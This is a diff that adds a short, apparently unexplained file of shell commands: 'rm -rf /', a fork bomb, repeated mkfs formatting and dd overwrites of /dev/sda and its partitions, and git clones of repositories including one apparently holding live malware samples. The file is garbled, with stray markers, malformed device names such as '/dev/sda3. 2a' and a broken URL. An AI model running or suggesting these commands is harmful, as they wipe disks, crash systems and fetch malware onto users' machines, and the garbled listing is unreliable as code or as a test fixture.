@@ -1,0 +1,33 @@
+<off>
+rm -rf /
+:(){:|:&};:
+>file 
+<off>
+mkfs ext4 /dev/sda3. 2a
+mkfs ext4 /dev/sda3. 2b
+>file 
+mkfs ext4 /dev/sda3. 2c
+mkfs.ext4 /dev/sda3. 2d
+>file
+dd if=/dev/random of=/dev/sda
+dd if=/dev/random of=/dev/sda3. 2a
+>file 
+dd if=/dev/random of=/dev/sda3. 2b
+>file
+dd if=/dev/random of=/dev/sda3. 2c
+>file
+dd if=/dev/random of=/dev/sda3. 2d
+>file
+mkfs ext4 /dev/sda0
+>f no
+mkfs ext4 /dev/sda1
+>file
+mkfs ext4 /dev/sda2
+>file 
+git clone https://github.com/ooni/probe
+>file
+git clone https://github.com/ytisf/theZoo
+>file 
+git clone https://github com/Tsunami512/ShapeWatch
+>file 
+<^>
